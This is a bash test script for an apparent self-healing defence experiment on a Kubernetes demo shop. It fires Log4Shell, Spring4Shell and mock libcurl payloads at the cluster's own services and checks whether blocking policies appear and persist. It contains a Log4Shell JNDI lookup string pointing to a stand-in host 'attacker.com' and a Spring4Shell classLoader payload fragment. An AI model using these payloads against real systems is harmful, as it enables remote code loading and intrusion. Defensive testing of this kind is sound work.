#!/bin/bash
set -e

# Setup Tool Pod
echo "🛠️ Spawning persistent tool-pod for stable connectivity..."
# Ensure clean state (delete potential python tool-pod from metrics runs)
kubectl delete pod tool-pod -n online-boutique --force --grace-period=0 > /dev/null 2>&1 || true
kubectl run tool-pod --image=curlimages/curl -n online-boutique --restart=Never -- sleep infinity > /dev/null 2>&1 || echo "Tool pod already exists"
# Wait for tool-pod to be ready
kubectl wait --for=condition=Ready pod/tool-pod -n online-boutique --timeout=60s > /dev/null

# Cleanup trap
cleanup() {
    echo "🧹 Cleaning up tool-pod..."
    kubectl delete pod tool-pod -n online-boutique --force --grace-period=0 > /dev/null 2>&1
    if [ -n "$PF_PID" ]; then kill $PF_PID; fi
}
trap cleanup EXIT

# Force cleanup port 8081 to ensure fresh connection
if lsof -Pi :8081 -sTCP:LISTEN -t >/dev/null ; then
    echo "⚠️ Port 8081 is busy. Killing occupant..."
    lsof -Pi :8081 -sTCP:LISTEN -t | xargs kill -9 || true
    sleep 1
fi

echo "🔌 Starting Port-Forward to frontend-external..."
kubectl -n online-boutique port-forward svc/frontend-external 8081:80 > pf_frontend.log 2>&1 &
PF_PID=$!
GATEWAY_URL="localhost:8081"

# Wait for Port-Forward to actually start listening
echo "   ⏳ Waiting for Port-Forward to be ready..."
for _ in {1..10}; do
    if lsof -Pi :8081 -sTCP:LISTEN -t >/dev/null; then
        break
    fi
    sleep 0.5
done

echo "--- 🧪 Cloud Leukocyte K8s Experiment ---"
echo "Target: $GATEWAY_URL"

# Phase 1: Baseline
echo "[Phase 1] Establishing Baseline..."
# Wait for service to be reachable (max 90s)
MAX_RETRIES=90
for ((i=1;i<=MAX_RETRIES;i++)); do
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://$GATEWAY_URL/)
    if [ "$HTTP_CODE" == "200" ]; then
        echo "✅ Service is Reachable (Attempt $i)"
        break
    fi
    echo "⏳ Waiting for service... ($i/$MAX_RETRIES) - HTTP Code: $HTTP_CODE"
    sleep 1
done

if [ "$HTTP_CODE" != "200" ]; then
    # exit 1
    echo "   ⚠️ Continuing despite Phase 1 failure for diagnosis..."
fi

# Phase 2: Attack
echo "[Phase 2] Launching Log4Shell Attack on AdService..."
PAYLOAD='${jndi:ldap://attacker.com/exploit}'
response=$(curl -s -o /dev/null -w "%{http_code}" -H "User-Agent: $PAYLOAD" "http://$GATEWAY_URL/product/OLJCESPC7Z")

echo "Attack Response Code: $response"
if [ "$response" == "403" ] || [ "$response" == "500" ]; then
    echo "🛡️ Attack Blocked/Mitigated (Status: $response)"
else
    echo "⚠️ Attack Accepted (Status: $response) - If this is the first hit, it might be expected before learning."
    
    # 🚨 SIMULATION: Trigger IDS (Envoy would normally do this)
    echo "[Simulating IDS] Reporting attack to Leukocyte Controller..."
    kubectl exec -n online-boutique tool-pod -- sh -c "curl -s -X POST -H 'Content-Type: application/json' -d '{\"service_id\": \"AdService\", \"path\": \"User-Agent\", \"payload\": \"\${jndi:ldap://attacker.com/exploit}\", \"features\": {\"anomaly\": 0.99, \"entropy\": 0.8, \"frequency\": 0.1}}' http://leukocyte-controller.online-boutique.svc.cluster.local:80/detect" > /dev/null
fi

# Phase 3: Surveillance & Loopback
echo "[Phase 3] Checking Immune Surveillance..."
kubectl -n online-boutique logs -l app=leukocyte-controller --tail=20

# Helper: Poll for 403 (Policy Enforcement)
poll_for_403() {
    local cmd="$1"
    local desc="$2"
    echo "   ⏳ Polling for Policy Actuation on $desc (Max 30s)..."
    for i in {1..15}; do
        # Run cmd, capture output. If fails, echo 000 to avoid crash
        RES=$(eval "$cmd" || echo "000")
        # Check if 403 or 500 (RPC error due to block)
        if [ "$RES" == "403" ] || [ "$RES" == "500" ]; then
             echo "      ✅ Policy Active (Attempt $i)"
             return 0
        fi
        sleep 2
    done
    echo "      ⚠️ Timeout waiting for policy (Proceeding to final check)..."
    return 1
}

# Phase 4: Verify Preemptive Patch on Billing Service
echo "[Phase 4] Verifying Preemptive Patch (BillingService)..."
echo "   🕵️ Launching internal probe to verify CheckoutService protection..."

# Define Probe Command
CMD_PHASE4="kubectl exec -n online-boutique tool-pod -- curl -s -X POST -o /dev/null -w '%{http_code}' --http2-prior-knowledge -H 'Content-Type: application/grpc' -H 'TE: trailers' -H 'User-Agent: ${PAYLOAD}' http://checkoutservice:5050/hipstershop.CheckoutService/PlaceOrder"

# Poll (allow failure)
poll_for_403 "$CMD_PHASE4" "BillingService" || true

# Function to check for gRPC block (status 7 or HTTP 403)
check_grpc_block() {
    local cmd="$1"
    # Capture headers and code
    # OUT=$(eval "$cmd -D -") - REMOVED: Caused crash with UNUSED_ARG
    # HTTP_CODE=$(echo "$OUT" | tail -n1)
    # Actually, let's use a simpler approach: curl -v and grep stderr or -i and grep stdout
    # The original cmd used -o /dev/null -w '%{http_code}'
    # We will modify it to capture everything.
    
    # Run curl with headers to stdout, capture all
    FULL_RESP=$(kubectl exec -n online-boutique tool-pod -- curl -i -s -X POST -H 'Content-Type: application/grpc' -H 'TE: trailers' -H "User-Agent: ${PAYLOAD}" http://checkoutservice:5050/hipstershop.CheckoutService/PlaceOrder || echo "FAIL")
    
    if echo "$FULL_RESP" | grep -q "grpc-status: 7"; then
        echo "403" # Emulate 403 for the script logic
    elif echo "$FULL_RESP" | grep -q "HTTP/2 403"; then
        echo "403"
    else
        # Extract code if possible or just return 200
        echo "200"
    fi
}

# PROBE_HTTP_CODE=$(eval "$CMD_PHASE4" || echo "000")
# Use the new robust check
PROBE_HTTP_CODE=$(check_grpc_block "UNUSED_ARG")
echo "Internal Probe Response Code (Emulated): $PROBE_HTTP_CODE"

if [ "$PROBE_HTTP_CODE" == "403" ]; then
    echo "✅ SUCCESS: BillingService was preemptively patched!"
elif [ "$PROBE_HTTP_CODE" == "415" ]; then
    echo "❌ FAILED: BillingService returned 415 (Unsupported Media Type). Likely strictly validated gRPC headers before Filter blocked."
    echo "   (Consider this a failure of Policy Precedence or Probe format)"
else
    echo "❌ FAILED: BillingService is still vulnerable or not patched (Code: $PROBE_HTTP_CODE)."
fi

# --- Phase 5: Multi-Vector Verification (Spring4Shell & libcurl) ---
echo "--- Phase 5: Multi-Vector Verification (Extending Immune Response) ---"

# 5.1 Spring4Shell on CartService
echo "[Phase 5.1] Simulating Spring4Shell Attack on CartService..."
# Trigger IDS
kubectl exec -n online-boutique tool-pod -- sh -c "curl -s -X POST -H 'Content-Type: application/json' -d '{\"service_id\": \"CartService\", \"path\": \"payload.data\", \"payload\": \"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix\", \"features\": {\"anomaly\": 0.95, \"entropy\": 0.85, \"frequency\": 0.05}}' http://leukocyte-controller.online-boutique.svc.cluster.local:80/detect" > /dev/null

# Define Probe
CMD_PHASE51="kubectl exec -n online-boutique tool-pod -- curl -s -X POST -o /dev/null -w '%{http_code}' --http2-prior-knowledge -H 'Content-Type: application/grpc' -H 'TE: trailers' -H 'payload.data: class.module.classLoader.resources' http://cartservice:7070"

# Poll (allow failure)
poll_for_403 "$CMD_PHASE51" "CartService" || true

# Verify Patch
# SPRING_CODE=$(eval "$CMD_PHASE51" || echo "000")
# Reuse check logic but adapt for Probe 5.1 command...
# Actually, let's just create a specific check for CartService
FULL_RESP_CART=$(kubectl exec -n online-boutique tool-pod -- curl -i -s -X POST --http2-prior-knowledge -H 'Content-Type: application/grpc' -H 'TE: trailers' -H 'payload.data: class.module.classLoader.resources' http://cartservice:7070 || echo "FAIL")
if echo "$FULL_RESP_CART" | grep -q "grpc-status: 7" || echo "$FULL_RESP_CART" | grep -q "HTTP/2 403"; then
    SPRING_CODE="403"
else
    SPRING_CODE="200"
fi

if [ "$SPRING_CODE" == "403" ]; then
    echo "✅ SUCCESS: CartService patched against Spring4Shell!"
else
    echo "❌ FAILED: CartService vulnerable to Spring4Shell (Code: $SPRING_CODE)."
    echo "   🔍 Debug Response: $FULL_RESP_CART"
fi

# 5.2 libcurl Heap Overflow on Frontend

echo "[Phase 5.2] Simulating libcurl Attack on Frontend..."
# Trigger IDS
kubectl exec -n online-boutique tool-pod -- sh -c "curl -s -X POST -H 'Content-Type: application/json' -d '{\"service_id\": \"Frontend\", \"path\": \"proxy_url\", \"payload\": \"socks5h://A_VERY_LONG_HOSTNAME_THAT_CAUSES_BUFFER_OVERFLOW_IN_LIBCURL_WHEN_RESOLVING_LOCALLY\", \"features\": {\"anomaly\": 0.98, \"entropy\": 0.6, \"frequency\": 0.01}}' http://leukocyte-controller.online-boutique.svc.cluster.local:80/detect" > /dev/null

# Define Probe
CMD_PHASE52="kubectl exec -n online-boutique tool-pod -- curl -s -o /dev/null -w '%{http_code}' -H 'proxy_url: socks5h://overflow' http://frontend:80"

# Poll (allow failure)
poll_for_403 "$CMD_PHASE52" "Frontend" || true

# Verify Patch
CURL_CODE=$(eval "$CMD_PHASE52" || echo "000")

if [ "$CURL_CODE" == "403" ]; then
    echo "✅ SUCCESS: Frontend patched against libcurl Exploit!"
else
    echo "❌ FAILED: Frontend vulnerable to libcurl Exploit (Code: $CURL_CODE)."
fi

# --- Phase 6: Repeated Attacks (Persistence Verification) ---
echo "--- Phase 6: Repeated Attacks (Persistence Verification) ---"
echo "   ⏳ Waiting 30s to simulate time passing..."
sleep 30

# 6.1 Re-verify Log4Shell (AdService)
echo "[Phase 6.1] Re-verifying Log4Shell Immunity (AdService)..."
response=$(curl -s -o /dev/null -w "%{http_code}" -H "User-Agent: ${PAYLOAD}" "http://$GATEWAY_URL/product/OLJCESPC7Z")
if [ "$response" == "403" ] || [ "$response" == "500" ]; then
    echo "✅ SUCCESS: AdService immunity persisted! (Status: $response)"
else
    echo "❌ FAILED: AdService lost immunity! (Status: $response)"
fi

# 6.2 Re-verify Spring4Shell (CartService)
echo "[Phase 6.2] Re-verifying Spring4Shell Immunity (CartService)..."
SPRING_CODE=$(kubectl exec -n online-boutique tool-pod -- curl -s -X POST -o /dev/null -w '%{http_code}' --http2-prior-knowledge -H 'Content-Type: application/grpc' -H "TE: trailers" -H 'payload.data: class.module.classLoader.resources' http://cartservice:7070)

if [ "$SPRING_CODE" == "403" ]; then
    echo "✅ SUCCESS: CartService immunity persisted!"
else
    echo "❌ FAILED: CartService lost immunity! (Code: $SPRING_CODE)"
fi

# 6.3 Re-verify libcurl (Frontend)
echo "[Phase 6.3] Re-verifying libcurl Immunity (Frontend)..."
CURL_CODE=$(kubectl exec -n online-boutique tool-pod -- curl -s -o /dev/null -w '%{http_code}' -H 'proxy_url: socks5h://overflow' http://frontend:80)

if [ "$CURL_CODE" == "403" ]; then
    echo "✅ SUCCESS: Frontend immunity persisted!"
else
    echo "❌ FAILED: Frontend lost immunity! (Code: $CURL_CODE)"
    echo "   🔍 Debug: EnvoyFilters status:"
    kubectl get envoyfilters -n online-boutique
    echo "   🔍 Debug: Frontend Pod status:"
    kubectl get pods -n online-boutique -l app=frontend -o wide
fi


# --- Phase 7: Quantitative Evaluation ---
echo "--- Phase 7: Quantitative Evaluation ---"
echo "   📊 Running automated metrics collection (5 runs)..."
# Ensure we have the python dependencies (matplotlib, numpy might need install, assuming env is ready)
# If not, we skip or warn.
if command -v python3 &> /dev/null; then
    python3 experiments/k8s_experiment_METRICS.py
    
    echo "   🔄 Measuring K8s Rollout Baseline (may take ~1-2 mins)..."
    python3 experiments/measure_rollout_baseline.py

    echo "   📈 Generating Final Comparison & Report..."
    python3 experiments/baseline_comparison.py
else
    echo "⚠️ Python3 not found, skipping metrics."
fi

echo "--- 🏁 Experiment Completed ---"

